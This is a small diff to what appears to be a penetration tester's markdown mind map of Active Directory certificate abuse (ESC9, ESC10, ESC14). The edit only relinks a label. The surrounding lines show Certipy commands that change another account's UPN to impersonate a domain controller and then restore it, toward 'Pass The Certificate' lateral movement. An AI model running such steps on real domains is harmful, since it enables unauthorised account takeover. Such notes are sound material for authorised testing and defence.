@@ -105,7 +105,7 @@ tags:
         - ESC10 (Case 2)
             - `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn '<dc_name$>@<domain>'` [↗](https://github.com/ly4k/Certipy) ➡️ [[ADCS|ESC10  Case1]]
     - reset accountB UPN
-        - `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>` [↗](https://github.com/ly4k/Certipy) ➡️ **Pass The Certificate**
+        - `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>` [↗](https://github.com/ly4k/Certipy) ➡️ [[Lateral Movement|Pass The Certificate]]
             - [Kerberos Mapping] ESC9/ESC10(Case 1)
             - [Schannel Mapping] ESC9/ESC10 (Case 2)
 - ESC14 (explicit)
